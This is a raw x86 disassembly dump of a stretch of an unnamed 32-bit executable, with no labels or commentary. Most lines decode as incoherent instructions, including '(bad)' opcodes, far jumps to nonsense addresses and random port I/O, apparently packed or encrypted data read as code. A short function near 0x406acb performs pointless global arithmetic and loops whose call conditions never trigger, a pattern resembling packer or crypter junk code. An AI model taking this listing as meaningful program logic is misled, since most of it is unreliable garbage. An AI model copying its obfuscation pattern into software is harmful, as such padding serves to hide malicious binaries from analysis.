  4069f3:	inc    eax
  4069f4:	pop    ebx
  4069f5:	ret    0x8524
  4069f8:	les    esi,FWORD PTR [edx-0x64ccebf7]
  4069fe:	outs   dx,BYTE PTR ds:[esi]
  4069ff:	out    dx,al
  406a00:	aaa    
  406a01:	aam    0x54
  406a03:	xchg   edi,eax
  406a04:	jmp    0x406a54
  406a06:	shr    ebx,1
  406a08:	xor    eax,DWORD PTR [edx+eiz*8]
  406a0b:	pushf  
  406a0c:	add    eax,0xe10ca859
  406a11:	dec    edx
  406a12:	push   es
  406a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a14:	ja     0x406a3b
  406a16:	hlt    
  406a17:	push   cs
  406a18:	push   esi
  406a19:	ja     0x406a25
  406a1b:	ret    0xdd73
  406a1e:	les    esp,FWORD PTR [esi+0x6d]
  406a21:	push   eax
  406a22:	mov    al,0x9a
  406a24:	sub    eax,0xb964a6d
  406a29:	int3   
  406a2a:	sub    ebx,DWORD PTR ds:0xf6a92cd6
  406a30:	loop   0x406a40
  406a32:	in     al,dx
  406a33:	xor    eax,0x41a149f8
  406a38:	jb     0x4069cd
  406a3a:	aad    0x93
  406a3c:	jmp    0x6006fe26
  406a41:	pop    ecx
  406a42:	int3   
  406a43:	mov    bh,0x5d
  406a45:	out    dx,eax
  406a46:	pop    esp
  406a47:	or     BYTE PTR [eax],ah
  406a49:	psadbw mm7,QWORD PTR [ecx+0x36794714]
  406a50:	push   ebx
  406a51:	add    al,0x69
  406a53:	jno    0x406a73
  406a55:	imul   ecx,DWORD PTR [edx-0x8],0xef293256
  406a5c:	xor    al,0x31
  406a5e:	dec    eax
  406a5f:	add    ebp,DWORD PTR [edi+0x74]
  406a62:	xchg   ecx,eax
  406a63:	adc    BYTE PTR ds:0x4c8ba2ff,al
  406a69:	push   ebx
  406a6a:	dec    ebx
  406a6b:	sub    ah,BYTE PTR gs:[ecx+0x2]
  406a6f:	sahf   
  406a70:	cwde   
  406a71:	dec    esi
  406a72:	dec    esi
  406a73:	xchg   ebp,eax
  406a74:	mov    al,0xe7
  406a76:	ret    
  406a77:	cmp    ch,BYTE PTR [ebx+0x363e0b06]
  406a7d:	pop    ds
  406a7e:	sbb    BYTE PTR [esi],dl
  406a80:	fucomi st,st(3)
  406a82:	add    ebp,edx
  406a84:	lods   eax,DWORD PTR ds:[esi]
  406a85:	xchg   esp,eax
  406a87:	pop    edi
  406a88:	cld    
  406a89:	mov    eax,ds:0x51dde46f
  406a8e:	pushf  
  406a8f:	out    0x68,al
  406a91:	mov    ax,ds:0x55dab746
  406a97:	fsub   DWORD PTR [ebx]
  406a99:	fimul  WORD PTR [edx+0x520d34fa]
  406a9f:	dec    eax
  406aa0:	fistp  WORD PTR [edi-0x4538b1e7]
  406aa6:	out    dx,al
  406aa7:	mov    DWORD PTR ds:0x1f84746c,0x1529865b
  406ab1:	ja     0x406a95
  406ab3:	fbstp  TBYTE PTR [edi+0x73001e86]
  406ab9:	jo     0x406b2e
  406abb:	add    DWORD PTR [edi-0x23],0x50
  406abf:	ds xor eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e7fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fe01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fdd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e7ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fdd9
  406b20:	and    esi,DWORD PTR ds:0x42e228
  406b26:	mov    DWORD PTR ds:0x42fdd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e7f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e7f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e7f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e3df
  406b61:	mov    edi,DWORD PTR ds:0x42e7f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e7f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fdf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fdf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fdf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fdfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e63f
  406bad:	mov    edi,DWORD PTR ds:0x42fdf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fdf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fde5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fde5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fde5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fde5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fde5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fded
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e55b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fe76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fe76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fe76,edi
  406c22:	cmp    DWORD PTR ds:0x42fe76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e807
  406c34:	push   0x42e2a4
  406c39:	call   DWORD PTR ds:0x42e643
  406c3f:	cmp    DWORD PTR ds:0x42fe76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fe76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fe76,edi
  406c59:	cmp    DWORD PTR ds:0x42fe76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e813,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e80b,0x42fe76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xb5
  406c9b:	and    dl,0xd5
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406ce7
  406ca7:	add    BYTE PTR [edi-0x3abc3403],al
  406cad:	ror    edi,1
  406caf:	call   0x2391d22b
  406cb4:	jl     0x406c9f
  406cb6:	retf   
  406cb7:	dec    esi
  406cb8:	or     BYTE PTR [esi-0x16],dh
  406cbb:	dec    eax
  406cbc:	mov    eax,0x27d99ba0
  406cc1:	adc    BYTE PTR [esi-0x1f],ah
  406cc4:	pusha  
  406cc5:	sub    ebp,DWORD PTR [esi+0x72]
  406cc8:	xlat   BYTE PTR ds:[ebx]
  406cc9:	push   ebx
  406cca:	loope  0x406caf
  406ccc:	retf   0xe67f
  406ccf:	push   ebp
  406cd0:	ret    
  406cd1:	pop    eax
  406cd2:	and    BYTE PTR [ebp-0xf],cl
  406cd5:	push   ebx
  406cd6:	sbb    DWORD PTR [eax+0x4cf2e0d4],ecx
  406cdc:	dec    BYTE PTR [ebx+0x51d97d2e]
  406ce2:	in     eax,0xc8
  406ce4:	ret    0x2bd2
  406ce7:	dec    eax
  406ce8:	pop    es
  406ce9:	push   ecx
  406cea:	int    0x8c
  406cec:	add    BYTE PTR [edi+0x1820b278],0x59
  406cf3:	and    al,0x81
  406cf5:	xchg   DWORD PTR [ecx+esi*1-0x6d],ecx
  406cf9:	lea    edx,[ecx+0x3a]
  406cfc:	and    eax,0xae28ba89
  406d01:	pusha  
  406d02:	pop    esi
  406d03:	mov    ?,WORD PTR [edi+0x245fba22]
  406d09:	mov    cr13,ebx
  406d0d:	test   eax,0xf13eb7b9
  406d12:	push   ds
  406d13:	jle    0x406ce5
  406d15:	fwait
  406d16:	sbb    eax,0x52c7b521
  406d1b:	(bad)  
  406d1c:	stos   DWORD PTR es:[edi],eax
  406d1d:	outs   dx,DWORD PTR ds:[esi]
  406d1e:	adc    BYTE PTR gs:[ecx-0x18c728c6],al
  406d25:	(bad)  
  406d27:	xor    esp,DWORD PTR [eax-0x2679745a]
  406d2d:	xor    BYTE PTR [eax],dl
  406d2f:	mov    eax,0x5a5bf73b
  406d34:	mov    es,edx
  406d36:	adc    BYTE PTR [esi+edi*2],dl
  406d39:	popf   
  406d3a:	adc    DWORD PTR [ebp+0x6357005d],edi
  406d40:	push   cs
  406d41:	jnp    0x406da8
  406d43:	push   0x2
  406d45:	ret    0xe0b3
  406d48:	pop    es
  406d49:	push   esp
  406d4a:	adc    BYTE PTR [eax+0x5e],bh
  406d4d:	mov    WORD PTR [edi],?
  406d4f:	sub    DWORD PTR [ecx],0x9fea2ed3
  406d55:	push   0xc6239b7a
  406d5a:	into   
  406d5b:	(bad)  
  406d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d5d:	test   DWORD PTR [ecx],esp
  406d5f:	stos   DWORD PTR es:[edi],eax
  406d60:	mov    DWORD PTR [edi+0x3944e6e0],ebx
  406d66:	pusha  
  406d67:	or     DWORD PTR [edi],0xafb3a246
  406d6d:	push   eax
  406d6e:	xchg   DWORD PTR [ebx+eax*2+0x2fe52b7c],eax
  406d75:	ss push esp
  406d77:	ds data16 lock cmp al,0x39
  406d7c:	fild   QWORD PTR [edx+0x1c1acc70]
  406d82:	jmp    0x406dae
  406d84:	xchg   BYTE PTR [ebx],bh
  406d86:	xor    al,ch
  406d88:	gs inc ebp
  406d8a:	imul   esi,DWORD PTR [eax],0xcfaef403
  406d90:	mov    edi,0x2e520b43
  406d95:	enter  0x623,0xbb
  406d99:	xchg   dh,bl
  406d9b:	sahf   
  406d9c:	lock xchg edx,eax
  406d9e:	jo     0x406e15
  406da0:	cmp    al,0xab
  406da2:	jge    0x406d98
  406da4:	sbb    dl,BYTE PTR [esi+0x45ee168f]
  406daa:	jmp    0xa1fa:0x401d048c
  406db1:	gs mov dh,0xa0
  406db4:	sub    ch,ah
  406db6:	or     DWORD PTR [ecx+ebx*1+0x44],0x1c
  406dbb:	mov    ah,0xe3
  406dbd:	mov    dl,0x91
  406dbf:	mov    ch,0xb5
  406dc1:	cmp    BYTE PTR [ebp+ecx*1-0x4c66f9ef],al
  406dc8:	dec    ecx
  406dc9:	mov    ebx,0xb528a2f2
  406dce:	je     0x406de2
  406dd0:	jg     0x406e43
  406dd2:	sbb    DWORD PTR [bp+di],ebp
  406dd5:	aam    0xeb
  406dd7:	out    dx,al
  406dd8:	xchg   ecx,eax
  406dd9:	push   0xfffffffe
  406ddb:	jp     0x406d87
  406ddd:	in     eax,0xad
  406ddf:	mov    ah,dl
  406de1:	sbb    dl,BYTE PTR [edx+0x36]
  406de4:	add    eax,DWORD PTR [eax+ebx*1]
  406de7:	outs   dx,BYTE PTR ds:[esi]
  406de8:	xor    DWORD PTR [eax],esp
  406dea:	ss es dec esp
  406ded:	imul   ebp,DWORD PTR [esi-0xd],0xfffffff2
  406df1:	cmp    eax,0xb65fa9bd
  406df6:	scas   al,BYTE PTR es:[edi]
  406df7:	nop
  406df8:	jle    0x406e1f
  406dfa:	mov    ss,WORD PTR [ebp-0x1588c064]
  406e00:	add    BYTE PTR [ebp+0x233fdd4],0x9c
  406e07:	aam    0xf2
  406e09:	fisttp WORD PTR [eax+0xe]
  406e0c:	mov    eax,0xb3a7561f
  406e11:	inc    edx
  406e12:	pop    ebp
  406e13:	sbb    al,0x9f
  406e15:	ror    BYTE PTR [ebx+0x6bdee447],0x4e
  406e1c:	int    0x2a
  406e1e:	cmp    DWORD PTR [edi+0x2e],ebx
  406e21:	sub    esi,DWORD PTR [ebp-0x1021576e]
  406e27:	mov    esi,0x704515c1
  406e2c:	xchg   bl,ah
  406e2e:	mov    ebx,0x384d80c5
  406e33:	clc    
  406e34:	in     eax,0xe0
  406e36:	and    esp,DWORD PTR [edx-0x12]
  406e39:	inc    ebp
  406e3a:	sbb    al,BYTE PTR ds:0xc55777d3
  406e40:	je     0x406e0f
  406e42:	jno    0x406e70
  406e44:	lahf   
  406e45:	jns    0x406e4e
  406e47:	sbb    esp,DWORD PTR [ebx]
  406e49:	arpl   WORD PTR [ecx],sp
  406e4b:	(bad)  
  406e4c:	fwait
  406e4d:	push   ds
  406e4e:	push   ebx
  406e4f:	bound  edx,QWORD PTR [ecx+0x59]
  406e52:	pop    ss
  406e53:	ret    0x9b46
  406e56:	or     eax,0xefa9a860
  406e5b:	jne    0x406e64
  406e5d:	into   
  406e5e:	jns    0x406e37
  406e60:	pop    edi
  406e61:	stc    
  406e62:	mov    dh,0xb6
  406e64:	xor    al,0xa1
  406e66:	dec    edi
  406e67:	ret    0x6aae
  406e6a:	add    BYTE PTR [esi],bl
  406e6c:	mov    bl,al
  406e6e:	add    BYTE PTR [esi-0x67],dh
  406e71:	sub    al,0x76
  406e73:	nop
  406e74:	xchg   DWORD PTR [edx-0x306d7611],eax
  406e7a:	dec    esi
  406e7b:	dec    ebp
  406e7c:	xor    al,0x59
  406e7e:	push   ebp
  406e7f:	out    dx,eax
  406e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e81:	loop   0x406e72
  406e83:	jecxz  0x406ec4
  406e85:	int    0x78
  406e87:	arpl   WORD PTR ds:0x27362943,bx
  406e8d:	out    0x6c,al
  406e8f:	fdiv   st(2),st
  406e91:	jnp    0x406e53
  406e93:	pop    eax
  406e94:	fistp  DWORD PTR [edi+0x0]
  406e97:	fdiv   st(1),st
  406e99:	icebp  
  406e9a:	push   esi
  406e9b:	stos   DWORD PTR es:[edi],eax
  406e9c:	int3   
  406e9d:	(bad)  
  406e9e:	out    0xfd,al
  406ea0:	and    BYTE PTR [edi-0x14679d93],cl
  406ea6:	mov    al,0x85
  406ea8:	and    DWORD PTR [ecx-0x363681de],edx
  406eae:	das    
  406eaf:	and    ecx,edi
  406eb1:	mov    DWORD PTR [ebp-0x71],ebx
  406eb4:	and    ch,ch
  406eb6:	add    al,0x92
  406eb8:	stos   DWORD PTR es:[edi],eax
  406eb9:	leave  
  406eba:	mov    ?,WORD PTR [edi+eax*2+0x1d51bae3]
  406ec1:	jecxz  0x406e58
  406ec3:	cmp    DWORD PTR ds:0x417c9d18,esp
  406ec9:	jmp    0x53c1bdf
  406ece:	scas   al,BYTE PTR es:[edi]
  406ecf:	jle    0x406e63
  406ed1:	mov    WORD PTR [esi-0x45546de3],es
  406ed7:	dec    eax
  406ed8:	pop    esp
  406ed9:	jnp    0x406ef5
  406edb:	aam    0xa8
  406edd:	(bad)  
  406ede:	out    0x67,al
  406ee0:	dec    esp
  406ee1:	pop    ss
  406ee2:	mov    ds:0xf3f06f48,al
  406ee7:	jmp    0xb804:0xc9e23072
  406eee:	clc    
  406eef:	xor    dl,bl
  406ef1:	jmp    0xc179:0x43c87b49
  406ef8:	int3   
  406ef9:	xor    dh,al
  406efb:	push   ebp
  406efc:	mov    eax,0x6317e3e8
  406f01:	ret    0x261d
  406f04:	mov    dh,0xbd
  406f06:	xchg   edx,eax
  406f07:	mul    BYTE PTR [eax-0x49]
  406f0a:	sar    bh,cl
  406f0c:	aad    0xd6
  406f0e:	pop    ds
  406f0f:	xchg   DWORD PTR [ebp-0x7101eb9f],edi
  406f15:	inc    ebp
  406f16:	pusha  
  406f17:	pop    ds
  406f18:	or     al,BYTE PTR [ecx-0x29775d34]
  406f1e:	test   al,0x17
  406f20:	in     al,dx
  406f21:	push   ebp
  406f22:	adc    BYTE PTR [edx+ecx*1+0x53],bh
  406f26:	mov    esi,DWORD PTR [edi-0x62]
  406f29:	mov    al,ds:0xa7f4295f
  406f2e:	pop    esp
  406f2f:	pop    ss
  406f30:	pop    ebx
  406f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f32:	jp     0x406f4e
  406f34:	mov    al,0x1
  406f36:	icebp  
  406f37:	(bad)  
  406f38:	retf   
  406f39:	sub    eax,0x6eabef8d
  406f3e:	aas    
  406f3f:	jg     0x406f86
  406f41:	sub    esi,DWORD PTR [ebx+0x74a0368b]
  406f47:	lds    edi,FWORD PTR [ecx]
  406f49:	cmp    al,BYTE PTR ss:[esi-0x5ed4c9f]
  406f50:	fild   DWORD PTR [ebp-0x2ef1440d]
  406f56:	iret   
  406f57:	dec    esp
  406f58:	dec    esi
  406f59:	in     al,0xd6
  406f5b:	inc    esi
  406f5c:	sbb    BYTE PTR [edi-0x63],ah
  406f5f:	hlt    
  406f60:	jle    0x406f66
  406f62:	or     ch,ah
  406f64:	pop    ss
  406f65:	or     esi,DWORD PTR [eax-0x3c9050f]
  406f6b:	mov    es,WORD PTR [ebx+0x6e]
  406f6e:	sub    ebx,DWORD PTR ds:0x557dee03
  406f74:	fadd   st,st(5)
  406f76:	sub    ebp,esp
  406f78:	mov    cl,0x9b
  406f7a:	cmc    
  406f7b:	ins    DWORD PTR es:[edi],dx
  406f7c:	and    eax,0xb2ab4562
  406f81:	cli    
  406f82:	daa    
  406f83:	mov    DWORD PTR [edx],eax
  406f85:	es clc 
  406f87:	mov    WORD PTR [edx],ds
  406f89:	js     0x406f30
  406f8b:	enter  0x5993,0xdb
  406f8f:	cmp    ebx,DWORD PTR [edi]
  406f91:	ins    BYTE PTR es:[edi],dx
  406f92:	inc    ebx
  406f93:	jno    0x406fce
  406f95:	push   eax
  406f96:	sbb    al,0x48
  406f98:	call   0x5587:0x5f91dd03
  406f9f:	test   al,0x7b
  406fa1:	push   edi
  406fa2:	stc    
  406fa3:	cmc    
  406fa4:	mov    cl,0xdd
  406fa6:	cmp    ch,al
  406fa8:	xchg   edx,eax
  406fa9:	or     DWORD PTR [ecx+0x3780e2c6],eax
  406faf:	(bad)  
  406fb0:	fnstenv [edx]
  406fb2:	adc    eax,0xb707a87
  406fb7:	adc    eax,0x76132720
  406fbc:	int    0x9f
  406fbe:	or     al,BYTE PTR [ebx-0xa]
  406fc1:	dec    esi
  406fc2:	sbb    bl,ch
  406fc4:	xor    BYTE PTR [edx-0x2a],dl
  406fc7:	test   bl,dl
  406fc9:	cmpxchg BYTE PTR [ebx],al
  406fcc:	add    eax,0x94b05596
  406fd1:	int    0x39
  406fd3:	pop    esi
  406fd4:	push   ecx
  406fd5:	hlt    
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fe72,0x42e80b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx+ebx*2+0x46],si
  40700e:	xor    edi,eax
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407085
  407018:	ja     0x40708b
  40701a:	add    esp,ebp
  40701c:	fimul  WORD PTR [edx-0x21]
  40701f:	mov    WORD PTR [edi+edx*4+0x5ef3cbfb],es
  407026:	sub    eax,0xa2bd25ac
  40702b:	xchg   esp,eax
  40702c:	inc    esp
  40702d:	fs out dx,eax
  40702f:	ins    BYTE PTR es:[edi],dx
  407030:	sbb    eax,0xe0e3f34a
  407035:	inc    ecx
  407036:	pop    ebp
  407037:	jp     0x4070a6
  407039:	std    
  40703a:	int    0xa7
  40703c:	or     al,0x9
  40703e:	add    esi,edi
  407040:	cmp    dl,BYTE PTR [edx]
  407042:	jp     0x407078
  407044:	sti    
  407045:	inc    edx
  407046:	mov    bl,bl
  407048:	popa   
  407049:	call   0x785b:0x1efdb58b
  407050:	mov    ecx,0xcfe77e79
  407055:	hlt    
  407056:	popa   
  407057:	cs adc eax,0x5db72144
  40705d:	test   DWORD PTR [esi],esp
  40705f:	dec    ebx
  407060:	stos   DWORD PTR es:[edi],eax
  407061:	nop
  407062:	ret    0xa02b
  407065:	inc    esi
  407066:	adc    al,0xae
  407068:	jns    0x4070b0
  40706a:	sahf   
  40706b:	inc    eax
  40706c:	and    DWORD PTR [ebp-0x52],edi
  40706f:	cmc    
  407070:	loop   0x407032
  407072:	(bad)  
  407073:	jp     0x4070ce
  407075:	or     DWORD PTR [edi],eax
  407077:	adc    DWORD PTR [edi+edx*8-0x17498895],ecx
  40707e:	loope  0x407019
  407080:	fdiv   QWORD PTR [edx-0x1c]
  407083:	sub    DWORD PTR [ecx-0x5c],0x7d668682
  40708a:	fwait
  40708b:	push   edx
  40708c:	sub    al,0x1a
  40708e:	inc    edx
  40708f:	aas    
  407090:	push   0xeee8a90f
  407095:	imul   edi,ecx,0x26491158
  40709b:	push   ss
  40709c:	arpl   WORD PTR ds:0x677c2ab1,bx
  4070a2:	je     0x40709d
  4070a4:	mov    edi,0xa4dd6d5b
  4070a9:	lea    edx,[eax-0x348822be]
  4070af:	mov    eax,DWORD PTR [edi-0x2c4bb2cb]
  4070b5:	sub    eax,0x8d02266b
  4070ba:	mov    bl,0x5c
  4070bc:	mov    dl,0x94
  4070be:	stos   BYTE PTR es:[edi],al
  4070bf:	sub    ecx,DWORD PTR [edi]
  4070c1:	fwait
  4070c2:	stc    
  4070c3:	scas   al,BYTE PTR es:[edi]
  4070c4:	mov    ?,WORD PTR [edx+0x6c]
  4070c7:	mov    dh,0x66
  4070c9:	pop    ds
  4070ca:	mov    ss,WORD PTR [esi]
  4070cc:	in     al,0x37
  4070ce:	jmp    0x50d66458
  4070d3:	in     al,0x2f
  4070d5:	call   0x8953:0x3bb6418f
  4070dc:	push   0xac7c05df
  4070e1:	out    0xba,al
  4070e3:	push   ebp
  4070e4:	sbb    eax,DWORD PTR ds:[ecx-0x7]
  4070e8:	inc    ebx
  4070e9:	popa   
  4070ea:	lods   eax,DWORD PTR ds:[esi]
  4070eb:	sbb    DWORD PTR [esp+edx*4],edx
  4070ee:	in     al,dx
  4070ef:	mov    eax,ds:0x576a6995
  4070f4:	sahf   
  4070f5:	fneni(8087 only) 
  4070f7:	and    esi,DWORD PTR [edi+0x15]
  4070fa:	aam    0xc9
  4070fc:	sbb    eax,0xe3661e0b
  407101:	or     BYTE PTR [eax],dl
  407103:	std    
  407104:	xchg   dl,dh
  407106:	sbb    DWORD PTR [ebp-0x1654edec],0x59
  40710d:	sub    eax,0x6c2e49c7
  407112:	or     dl,BYTE PTR [edx-0x2842748d]
  407118:	pop    edx
  407119:	sub    esi,DWORD PTR ds:0x7ce1159f
  40711f:	xlat   BYTE PTR ds:[ebx]
  407120:	ds pop edx
  407122:	ins    BYTE PTR es:[edi],dx
  407123:	inc    esp
  407124:	repnz sbb DWORD PTR [ebx+0x4a275254],esi
  40712b:	sub    al,0x87
  40712d:	retf   
  40712e:	sbb    ch,BYTE PTR [ebx-0x10]
  407131:	mov    ebx,ebx
  407133:	enter  0xbc27,0x73
  407137:	aaa    
  407138:	jmp    0x40716e
  40713a:	cdq    
  40713b:	push   ds
  40713c:	sar    BYTE PTR [edx-0x4e],0xf2
  407140:	dec    esp
  407141:	out    0x21,al
  407143:	dec    ecx
  407144:	xchg   esi,eax
  407145:	iret   
  407146:	add    eax,0x35ffea7b
  40714b:	dec    ebx
  40714c:	out    0x27,eax
  40714e:	and    edx,DWORD PTR [edi+0x1e]
  407151:	lods   al,BYTE PTR ds:[esi]
  407152:	in     eax,dx
  407153:	and    ah,BYTE PTR [edx-0x7b]
  407156:	and    dl,ch
  407158:	lods   al,BYTE PTR ds:[esi]
  407159:	pop    ebx
  40715a:	pushf  
  40715b:	push   ss
  40715c:	inc    esp
  40715d:	sbb    edi,DWORD PTR [esi]
  40715f:	push   0xffffffe6
  407161:	out    0xf3,eax
  407163:	mov    edi,0x24ae86a8
  407168:	and    eax,0xc4b3e2d6
  40716d:	arpl   WORD PTR [edi],di
  40716f:	fild   WORD PTR [edx]
  407171:	ins    BYTE PTR es:[edi],dx
  407172:	or     ebx,DWORD PTR [eax-0x6c]
  407175:	(bad)  
  407176:	jae    0x407135
  407178:	pop    ebx
  407179:	and    DWORD PTR [edi+0x6edc6bf6],eax
  40717f:	jno    0x407144
  407181:	push   ds
  407182:	add    BYTE PTR [edx+0x5f],ah
  407185:	mov    BYTE PTR [eax],ah
  407187:	adc    al,0xb1
  407189:	or     ecx,ebx
  40718b:	xchg   esi,eax
  40718c:	inc    eax
  40718d:	pop    ebp
  40718e:	add    eax,0x4e124d0f
  407193:	loop   0x407213
  407195:	mov    WORD PTR [edx-0x30],cs
  407198:	loopne 0x4071a7
  40719a:	sbb    eax,0xf1861ad6
  40719f:	xor    BYTE PTR ds:0x42c1c9ad,bl
  4071a5:	mov    WORD PTR [edi],fs
  4071a7:	daa    
  4071a8:	jo     0x4071e1
  4071aa:	ret    0x1b03
  4071ad:	out    0x87,eax
  4071af:	les    edi,FWORD PTR [eax-0x103971c2]
  4071b5:	(bad)  
  4071b6:	pop    ebx
  4071b7:	pop    ebx
  4071b8:	psubq  mm7,mm1
  4071bb:	(bad)  
  4071bc:	jl     0x40720f
  4071be:	aam    0x5e
  4071c0:	mov    edx,0xc30a809
  4071c5:	pop    edi
  4071c6:	pop    ds
  4071c7:	push   ss
  4071c8:	or     dl,BYTE PTR [esi+0x6d55cf08]
  4071ce:	mov    ebx,0x22354353
  4071d3:	sar    DWORD PTR [edi+0x1a],cl
  4071d6:	xor    esi,DWORD PTR [ebp+0x3faff3db]
  4071dc:	sbb    eax,0x6bcf8165
  4071e1:	fldcw  WORD PTR [eax+0x7d]
  4071e4:	rcr    BYTE PTR [esi-0x4],1
  4071e7:	jle    0x4071e8
  4071e9:	mov    gs,WORD PTR [ecx-0x2c]
  4071ec:	jl     0x4071d2
  4071ee:	dec    DWORD PTR [ebx+0x681b902]
  4071f4:	jmp    0x1523:0xe6316657
  4071fb:	cmp    eax,0x87a9fd7e
  407200:	test   edx,0x6d2ee993
  407206:	sub    BYTE PTR [edx],al
  407208:	pop    ecx
  407209:	setge  BYTE PTR [edi-0x1e]
  40720d:	rcr    DWORD PTR [eax+0x44f007a5],1
  407213:	jo     0x407235
  407215:	xchg   DWORD PTR [edi],ecx
  407217:	dec    esi
  407218:	scas   eax,DWORD PTR es:[edi]
  407219:	clc    
  40721a:	rcl    DWORD PTR [edi+0x38d3e03b],cl
  407220:	jne    0x40722d
  407222:	retf   
  407223:	in     eax,0xfa
  407225:	int3   
  407226:	push   ebp
  407227:	push   0x5c325640
  40722c:	pop    ss
  40722d:	push   ss
  40722e:	stc    
  40722f:	fld    DWORD PTR [ecx+0x7029cd80]
  407235:	or     dh,BYTE PTR [eax+0x354ab8ed]
  40723b:	push   ss
  40723c:	sub    eax,0xba7d236f
  407241:	xor    bh,dl
  407243:	cmp    DWORD PTR [esi],edi
  407245:	inc    edx
  407246:	das    
  407247:	sub    al,0x6c
  407249:	jmp    0x2aba:0x3bf61100
  407250:	retf   0xb50f
  407253:	bound  ebx,QWORD PTR [edx-0x59]
  407256:	mov    eax,ds:0x21cf4d4d
  40725b:	mov    eax,ds:0x27d2fdba
  407260:	xor    DWORD PTR [ebp-0x55],ebx
  407263:	sbb    ah,0x56
  407266:	push   0x3e
  407268:	sub    edx,DWORD PTR [esi+0xd931e4a]
  40726e:	jl     0x407296
  407270:	je     0x4072cc
  407272:	pop    es
  407273:	dec    ebp
  407274:	mov    bh,0x58
  407276:	or     al,0xf6
  407278:	mov    edi,0x308e67d6
  40727d:	jae    0x407210
  40727f:	add    al,0x4d
  407281:	mov    dh,0x2c
  407283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407284:	cwde   
  407285:	stos   DWORD PTR es:[edi],eax
  407286:	xchg   ebp,eax
  407287:	sar    BYTE PTR [ecx+eiz*1-0x4c],cl
  40728b:	lahf   
  40728c:	pop    ebp
  40728d:	loope  0x407244
  40728f:	sbb    cl,BYTE PTR [ebx]
  407291:	jmp    0x407247
  407293:	jne    0x4072a0
  407295:	jne    0x40729a
  407297:	adc    ecx,ebx
  407299:	dec    esp
  40729a:	xlat   BYTE PTR ds:[ebx]
  40729b:	pop    esp
  40729c:	(bad)  
  40729d:	aam    0xd8
  40729f:	cwde   
  4072a0:	cmp    al,0x8c
  4072a2:	xchg   ebp,ecx
  4072a4:	pop    es
  4072a5:	leave  
  4072a6:	fistp  QWORD PTR [edi-0xe]
